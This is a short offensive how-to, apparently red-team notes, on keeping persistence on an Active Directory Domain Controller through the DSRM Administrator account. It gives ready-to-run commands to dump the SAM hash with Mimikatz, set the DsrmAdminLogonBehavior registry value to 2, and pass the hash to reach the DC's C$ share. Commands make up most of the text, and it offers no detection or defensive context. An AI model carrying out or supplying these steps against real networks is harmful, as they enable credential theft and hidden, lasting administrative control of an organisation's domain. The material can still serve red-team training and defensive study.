### **OVERVIEW**
Domain Controllers (DC) have a local Administrator account that can be leveraged for persistence. By gaining administrative privileges on a DC and dumping the local Administrator hash, you can modify the registry to enable remote access to this account.

1. Use Mimikatz to dump the hash of the local Administrator account on the DC.  
	`Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'`

2. Modify Registry to Enable Remote Access
	Check if the `DsrmAdminLogonBehavior` registry key exists and has the correct value. If not, create or modify it. 
3. Check if the key exists and get its value  
	`Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior`
4. Create the key with value "2" if it doesn't exist  
	`New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD`
5. Change the value to "2" if it exists but is set incorrectly  
	`Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior -Value 2`
6. Pass-the-Hash (PTH) to Gain Access
	Use the dumped hash to authenticate and access the DC remotely. Note that the "domain" used is the name of the DC machine.
7. Use sekurlsa::pth to pass the hash   
	`sekurlsa::pth /domain:[DC_MACHINE_NAME] /user:[USERNAME] /ntlm:[HASH] /run:[CMD]`
8. Example: List the content of C$ share   
	`ls \\[DC_MACHINE_NAME]\C$`